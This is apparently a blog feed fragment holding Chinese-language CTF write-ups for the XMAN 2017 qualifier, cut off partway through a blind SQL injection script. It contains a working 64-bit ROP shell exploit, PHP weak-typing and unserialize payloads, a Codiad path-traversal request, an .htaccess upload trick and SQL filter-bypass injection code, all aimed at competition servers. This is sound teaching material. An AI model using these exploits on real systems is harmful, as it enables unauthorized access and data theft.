      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="CTFZone" scheme="http://yoursite.com/tags/CTFZone/"/>
    
  </entry>
  
  <entry>
    <title>XMAN选拔赛-2017-misc-writeup</title>
    <link href="http://yoursite.com/2017/07/17/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-misc-writeup/"/>
    <id>http://yoursite.com/2017/07/17/XMAN选拔赛-2017-misc-writeup/</id>
    <published>2017-07-17T13:37:52.000Z</published>
    <updated>2017-07-17T13:37:52.391Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>XMAN选拔赛-2017-pwn-writeup</title>
    <link href="http://yoursite.com/2017/07/16/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-pwn-writeup/"/>
    <id>http://yoursite.com/2017/07/16/XMAN选拔赛-2017-pwn-writeup/</id>
    <published>2017-07-16T11:58:11.000Z</published>
    <updated>2017-07-17T13:44:46.558Z</updated>
    
    <content type="html"><![CDATA[<p>XMAN选拔赛-2017-pwn-writeup。<br><a id="more"></a></p>
<h1 id="Raaa"><a href="#Raaa" class="headerlink" title="Raaa"></a>Raaa</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Are you ok? Do you like mifan?</div><div class="line">nc challenges.xctf.org.cn 14005</div></pre></td></tr></table></figure>
<p>太简单。rand()。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</div><div class="line">	<span class="keyword">int</span> a = rand() ^ <span class="number">590558003</span>;</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"%d\n"</span>, a);</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>得到1220048468，输入。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">(venv) chybeta@ubuntu:~/pwn/ctf/XMAN2017/pwn/Raaa$ nc challenges.xctf.org.cn 14005</div><div class="line">1220048468</div><div class="line">XMAN&#123;Have_y0u_ever_heard_of_AnLi,my_fr1end?&#125;</div><div class="line">heiheiehi!</div></pre></td></tr></table></figure></p>
<h1 id="Baaa"><a href="#Baaa" class="headerlink" title="Baaa"></a>Baaa</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">If you give me three days light。</div><div class="line">nc challenges.xctf.org.cn 14002</div></pre></td></tr></table></figure>
<p>没给程序：）。好吧google大法好。发现是16年CSAW-warmup原题。<a href="https://www.megabeets.net/csaw-2016-pwn-warmup-writeup/" target="_blank" rel="external">https://www.megabeets.net/csaw-2016-pwn-warmup-writeup/</a></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170716/2.png?raw=true" alt=""><br>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">XMAN&#123;Ba1a1a_Xiao_Mo_Xian,BianBIanBian&#125;</div></pre></td></tr></table></figure></p>
<h1 id="Caaa"><a href="#Caaa" class="headerlink" title="Caaa"></a>Caaa</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">一心想学bin的张日天报名了xman，开学的时候老师让大家自我介绍：</div><div class="line">老师（手上拿着名单册子）：好，下一位，请*言简意赅*的介绍自己</div><div class="line"></div><div class="line">nc challenges.xctf.org.cn 14000</div></pre></td></tr></table></figure>
<p><img src="" alt=""></p>
<p>很明显的栈溢出，64位rop。溢出点用pattern生成后，在gdb中<code>x/gx $rsp</code>查看再带回pattern即可求出偏移为40。要是直接看IDA的话，buf的位置在<code>bp-20h</code>，0x20+8=40，也确实是40个字节。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">p = process(<span class="string">"./2ddf143c-dd2f-4ce0-9409-9e8f72f5364a.bin"</span>)</div><div class="line"><span class="comment"># p = remote("challenges.xctf.org.cn","14000")</span></div><div class="line">elf = ELF(<span class="string">"./2ddf143c-dd2f-4ce0-9409-9e8f72f5364a.bin"</span>)</div><div class="line">system_addr = elf.symbols[<span class="string">'system'</span>]</div><div class="line">pop_rdi_ret = <span class="number">0x0000000000400973</span></div><div class="line">sh_addr = next(elf.search(<span class="string">'/bin/sh\x00'</span>))</div><div class="line">offset = <span class="number">40</span></div><div class="line"></div><div class="line">p.recv()</div><div class="line">p.sendline(<span class="string">"1"</span>)</div><div class="line">p.recv()</div><div class="line"></div><div class="line">payload = <span class="string">'a'</span> * offset</div><div class="line">payload += p64(pop_rdi_ret)</div><div class="line">payload += p64(sh_addr)</div><div class="line">payload += p64(system_addr)</div><div class="line"></div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">(venv) chybeta@ubuntu:~/pwn/ctf/XMAN2017/pwn/Caaa$ python exp.py</div><div class="line">[+] Opening connection to challenges.xctf.org.cn on port 14000: Done</div><div class="line">[*] &apos;/home/chybeta/pwn/ctf/XMAN2017/pwn/Caaa/2ddf143c-dd2f-4ce0-9409-9e8f72f5364a.bin&apos;</div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX disabled</div><div class="line">    PIE:      No PIE</div><div class="line">[*] Switching to interactive mode</div><div class="line">1</div><div class="line">your name is:</div><div class="line">hello, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaas    @!</div><div class="line">$ cat /home/xman/flag</div><div class="line">xman&#123;Welcome_to_bin_world!&#125;$</div></pre></td></tr></table></figure>
<p>剩下的pwn题，好像都是跟堆有关的。还不会，暂时就不写了。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;XMAN选拔赛-2017-pwn-writeup。&lt;br&gt;
    
    </summary>
    
      <category term="二进制安全" scheme="http://yoursite.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>XMAN选拔赛-2017-web-writeup</title>
    <link href="http://yoursite.com/2017/07/16/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-web-writeup/"/>
    <id>http://yoursite.com/2017/07/16/XMAN选拔赛-2017-web-writeup/</id>
    <published>2017-07-16T03:03:50.000Z</published>
    <updated>2017-07-17T11:59:26.212Z</updated>
    
    <content type="html"><![CDATA[<p>XMAN选拔赛-2017-web-writeup 都是基础题目<br><a id="more"></a></p>
<h1 id="variacover"><a href="#variacover" class="headerlink" title="variacover"></a>variacover</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_GET[<span class="string">'b'</span>])) &#123;</div><div class="line">   show_source(<span class="keyword">__FILE__</span>);</div><div class="line">   <span class="keyword">die</span>();</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">   <span class="keyword">include</span>(<span class="string">'flag.php'</span>);</div><div class="line">$a = <span class="string">"www.XMAN.com"</span>;</div><div class="line">$b = $_GET[<span class="string">'b'</span>];</div><div class="line">@parse_str($b);</div><div class="line"><span class="keyword">if</span> ($a[<span class="number">0</span>] != <span class="string">'QNKCDZO'</span> &amp;&amp; md5($a[<span class="number">0</span>]) == md5(<span class="string">'QNKCDZO'</span>)) &#123;</div><div class="line">   <span class="keyword">echo</span> $flag;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line"><span class="keyword">exit</span>(<span class="string">'你的答案不对0.0'</span>);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>parse_str变量覆盖漏洞，和php弱类型比较问题。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://challenges.xctf.org.cn:7771/?b=a[0]=240610708</div></pre></td></tr></table></figure>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">XMAN&#123;A_sTr_covcderd_t3st_you_oW?&#125;</div></pre></td></tr></table></figure></p>
<h1 id="urldecode"><a href="#urldecode" class="headerlink" title="urldecode"></a>urldecode</h1><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170716/1.jpg?raw=true" alt=""></p>
<p>改为XMAN后提示urldecode：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170716/2.jpg?raw=true" alt=""></p>
<p>考点应该是类似二次注入类型，<br>将XMAN进行一次urlencode，再把其中的%替换为%25，最后的payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://challenges.xctf.org.cn:7772/?me=%2558%254d%2541%254e</div></pre></td></tr></table></figure></p>
<p>得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">XMAN&#123;UrlDeCode_CooL_yOu_u0D3rSta9D!</div></pre></td></tr></table></figure></p>
<h1 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h1><p>比赛时没做这题。<br>.htaccess。先自己新建一个文件<code>.htaccess</code>，内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;FilesMatch &quot;_chybeta.gif&quot;&gt;</div><div class="line">SetHandler application/x-httpd-php</div><div class="line">&lt;/FilesMatch&gt;</div></pre></td></tr></table></figure></p>
<p>然后现在要上传跟我说已经exist了。好吧GG。比赛结束后没人维护了。</p>
<h1 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a>unserialize</h1><p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://challenges.xctf.org.cn:7774/?code=1</div></pre></td></tr></table></figure></p>
<p>得到hint: flag.php。访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://challenges.xctf.org.cn:7774/flag.php</div></pre></td></tr></table></figure></p>
<p>得到hint2: help.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://challenges.xctf.org.cn:7774/help.php</div></pre></td></tr></table></figure></p>
<p>得到hint3：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">class FileClass&#123; public $filename = &apos;error.log&apos;; public function __toString()&#123; return file_get_contents($this-&gt;filename); &#125; &#125;</div></pre></td></tr></table></figure></p>
<p>知道是反序列化问题，用下面代码生成：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileClass</span></span>&#123;</div><div class="line">	<span class="keyword">public</span> $filename = <span class="string">'error.log'</span>;</div><div class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</div><div class="line">		<span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$chybeta = <span class="keyword">new</span> FileClass();</div><div class="line">$chybeta-&gt;filename = <span class="string">'flag.php'</span>;</div><div class="line"><span class="keyword">echo</span> serialize($chybeta);</div></pre></td></tr></table></figure></p>
<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://challenges.xctf.org.cn:7774/?code=O:9:&quot;FileClass&quot;:1:&#123;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125;</div></pre></td></tr></table></figure></p>
<p>最后flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">XMAN&#123;UUNser1AL1Z3_XMAN__0)(0&#125;</div></pre></td></tr></table></figure></p>
<p>这题源码：<br>index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_GET[<span class="string">'code'</span>]))&#123;</div><div class="line"><span class="keyword">exit</span>(<span class="string">'?code='</span>);</div><div class="line">&#125;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileClass</span></span>&#123;</div><div class="line">    <span class="keyword">public</span> $filename = <span class="string">'error.log'</span>;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</div><div class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;  </div><div class="line">    <span class="keyword">public</span> $name = <span class="string">''</span>;  </div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>  </span></div><div class="line">    &#123;  </div><div class="line">        <span class="keyword">return</span> <span class="string">'User '</span> . <span class="keyword">$this</span>-&gt;name . <span class="string">' is '</span> . <span class="keyword">$this</span>-&gt;age . <span class="string">' years old. &lt;br /&gt;'</span>;  </div><div class="line">    &#125;  </div><div class="line">&#125;</div><div class="line"><span class="keyword">echo</span> <span class="string">"hint: flag.php"</span>;</div><div class="line">$obj = unserialize($_GET[<span class="string">'code'</span>]);</div><div class="line"><span class="keyword">echo</span> $obj;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><p>扫到index.php~，源码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$a=<span class="number">0</span>;</div><div class="line">$b=<span class="number">0</span>;</div><div class="line">$c=<span class="number">0</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'aaa'</span>]))</div><div class="line">&#123;</div><div class="line">        $aaa = $_GET[<span class="string">'aaa'</span>];</div><div class="line">		$aaa==<span class="string">"1"</span>?<span class="keyword">die</span>(<span class="string">"Emmm..."</span>):<span class="keyword">NULL</span>;</div><div class="line">        <span class="keyword">switch</span> ($aaa)</div><div class="line">        &#123;</div><div class="line">        <span class="keyword">case</span> <span class="number">0</span>:</div><div class="line">        <span class="keyword">case</span> <span class="number">1</span>:</div><div class="line">                $a=<span class="number">1</span>;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">&#125;</div><div class="line">$bbb=(<span class="keyword">array</span>)json_decode(@$_GET[<span class="string">'bbb'</span>]);</div><div class="line"><span class="keyword">if</span>(is_array($bbb))&#123;</div><div class="line">    is_numeric(@$bbb[<span class="string">"ccc"</span>])?<span class="keyword">die</span>(<span class="string">"Emmm..."</span>):<span class="keyword">NULL</span>;</div><div class="line">    <span class="keyword">if</span>(@$bbb[<span class="string">"ccc"</span>])&#123;</div><div class="line">        ($bbb[<span class="string">"ccc"</span>]&gt;<span class="number">2017</span>)?$b=<span class="number">1</span>:<span class="keyword">NULL</span>;</div><div class="line">    &#125;</div><div class="line">	<span class="keyword">if</span>(is_array(@$bbb[<span class="string">"ddd"</span>]))&#123;</div><div class="line">        <span class="keyword">if</span>(count($bbb[<span class="string">"ddd"</span>])!==<span class="number">2</span> <span class="keyword">OR</span> !is_array($bbb[<span class="string">"ddd"</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">"Emmm..."</span>);</div><div class="line">        $eee = array_search(<span class="string">"XMAN"</span>, $bbb[<span class="string">"ddd"</span>]);</div><div class="line">        $eee===<span class="keyword">false</span>?<span class="keyword">die</span>(<span class="string">"Emmm..."</span>):<span class="keyword">NULL</span>;</div><div class="line">        <span class="keyword">foreach</span>($bbb[<span class="string">"ddd"</span>] <span class="keyword">as</span> $key=&gt;$val)&#123;</div><div class="line">            $val===<span class="string">"XMAN"</span>?<span class="keyword">die</span>(<span class="string">"Emmm..."</span>):<span class="keyword">NULL</span>;</div><div class="line">        &#125;</div><div class="line">        $c=<span class="number">1</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>($a &amp;&amp; $b &amp;&amp; $c)&#123;</div><div class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>;</div><div class="line">    <span class="keyword">echo</span> $flag;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>考察php弱类型。payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://challenges.xctf.org.cn:8004/index.php?aaa=1abcdef&amp;bbb=&#123;&quot;ccc&quot;:&quot;2018a&quot;,&quot;ddd&quot;:[[1],0]&#125;</div></pre></td></tr></table></figure></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">XMAN&#123;PHP_IS_THE_BEST_LANGUAGE&#125;</div></pre></td></tr></table></figure></p>
<h1 id="downloaded"><a href="#downloaded" class="headerlink" title="downloaded"></a>downloaded</h1><p>用admin登陆后发现是Codiad 2.5.3，exploit-db上找到poc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://www.exploit-db.com/exploits/36371/</div></pre></td></tr></table></figure></p>
<p>找flag的位置花了一点时间。最后paylaod:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://challenges.xctf.org.cn:7775/components/filemanager/download.php?path=../../../../../../../../../../../var/www/flag.txt&amp;type=undefined</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">XMAN&#123;D0WnL0D_3v3RYTh1ng_You_Win&#125;</div></pre></td></tr></table></figure>
<h1 id="spring"><a href="#spring" class="headerlink" title="spring"></a>spring</h1><p>CVE-2017-4971：Spring WebFlow漏洞。到处找poc。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170716/3.jpg?raw=true" alt=""></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170716/4.jpg?raw=true" alt=""></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170716/5.jpg?raw=true" alt=""></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170716/6.jpg?raw=true" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">XMAN&#123;UGhoiXoeDae6zeethaxoh1eex3xeiJ7y&#125;</div></pre></td></tr></table></figure>
<p>参考：<a href="https://github.com/Medicean/VulApps/tree/master/s/springwebflow/1" target="_blank" rel="external">https://github.com/Medicean/VulApps/tree/master/s/springwebflow/1</a></p>
<h1 id="CTF用户登录"><a href="#CTF用户登录" class="headerlink" title="CTF用户登录"></a>CTF用户登录</h1><p>在登陆处存在注入，登陆成功与否加载了html标签前，直接用浏览器看是看不到的不会解析。经过fuzz，可以知道过滤了逗号，空格等，但union select，substr，and，or，单引号，#没有过滤。</p>
<ul>
<li><p>逗号被过滤，可以用以下方式绕过：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mid(user() from 1 for 1)</div><div class="line">或</div><div class="line">substr(user() from 1 for 1)</div></pre></td></tr></table></figure>
</li>
<li><p>空格被过滤，可以用tab键绕过，其url编码为%09</p>
</li>
</ul>
<p>所以这题就是盲注，下面附上python脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> string</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line"><span class="keyword">global</span> findBit</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendPayload</span><span class="params">(payload)</span>:</span></div><div class="line">	proxy = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</div><div class="line">	url = <span class="string">"http://challenges.xctf.org.cn:8003/login.php"</span></div><div class="line">	headers = &#123;<span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>&#125;</div><div class="line">	parm = <span class="string">"username="</span>+payload+<span class="string">"&amp;password=bb&amp;submit="</span></div><div class="line">	content = requests.post(url,data=parm,headers=headers,proxies=proxy)</div><div class="line">	<span class="keyword">return</span> content.text</div><div class="line"></div><div class="line">cuowu = <span class="string">'\u9519\u8bef'</span>.decode(<span class="string">'unicode_escape'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">generateTarget</span><span class="params">(flag)</span>:</span></div><div class="line">	<span class="keyword">if</span> flag == <span class="string">"database"</span>:</div><div class="line">		<span class="keyword">return</span> <span class="string">"database()"</span></div><div class="line">	<span class="keyword">elif</span> flag == <span class="string">"tables"</span>:</div><div class="line">		<span class="keyword">return</span> <span class="string">"(SELECT%09GROUP_CONCAT(table_name%09SEPARATOR%090x3c62723e)%09FROM%09INFORMATION_SCHEMA.TABLES%09WHERE%09TABLE_SCHEMA=0x786d616e)"</span></div><div class="line">	<span class="keyword">elif</span> flag == <span class="string">"columns"</span>:</div><div class="line">		<span class="keyword">return</span> <span class="string">"(SELECT%09GROUP_CONCAT(column_name%09SEPARATOR%090x3c62723e)%09FROM%09INFORMATION_SCHEMA.COLUMNS%09WHERE%09TABLE_NAME=0x6374665f7573657273)"</span></div><div class="line">	<span class="keyword">elif</span> flag == <span class="string">"data"</span>:</div><div class="line">		<span class="keyword">return</span> <span class="string">"(SELECT%09GROUP_CONCAT(gpass%09SEPARATOR%090x3c62723e)%09FROM%09ctf_users)"</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">doubleSearch</span><span class="params">(leftNum,rightNum,i,target)</span>:</span></div><div class="line">	<span class="keyword">global</span> findBit</div><div class="line">	midNum = (leftNum + rightNum) / <span class="number">2</span></div><div class="line">	<span class="keyword">if</span> (rightNum != leftNum +<span class="number">1</span>):</div><div class="line">		payload = <span class="string">"a'%09or%09(%09select%09ascii(substr("</span>+generateTarget(target) +<span class="string">"%09from%09"</span>+ str(i) +<span class="string">"%09for%091))&lt;="</span>+str(midNum) +<span class="string">")%23"</span></div><div class="line">		<span class="comment"># print payload</span></div><div class="line">		recv = sendPayload(payload)</div><div class="line">		<span class="comment"># print recv</span></div><div class="line">		<span class="keyword">if</span> cuowu <span class="keyword">in</span> recv:</div><div class="line">			<span class="comment"># print 'cuowu'</span></div><div class="line">			<span class="comment"># raw_input()</span></div><div class="line">			doubleSearch(midNum,rightNum,i,target)</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			<span class="comment"># print 'chenggong'</span></div><div class="line">			<span class="comment"># raw_input()</span></div><div class="line">			doubleSearch(leftNum,midNum,i,target)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		<span class="keyword">if</span> rightNum != <span class="number">0</span>:</div><div class="line">			<span class="comment"># print rightNum</span></div><div class="line">			<span class="comment"># raw_input()</span></div><div class="line">			sys.stdout.write(chr(rightNum))</div><div class="line">			sys.stdout.flush()</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			findBit = <span class="number">1</span></div><div class="line">			<span class="keyword">return</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">global</span> findBit</div><div class="line"></div><div class="line">	i = <span class="number">1</span></div><div class="line">	findBit = <span class="number">0</span></div><div class="line">	<span class="keyword">print</span> <span class="string">"The database:"</span></div><div class="line">	target = <span 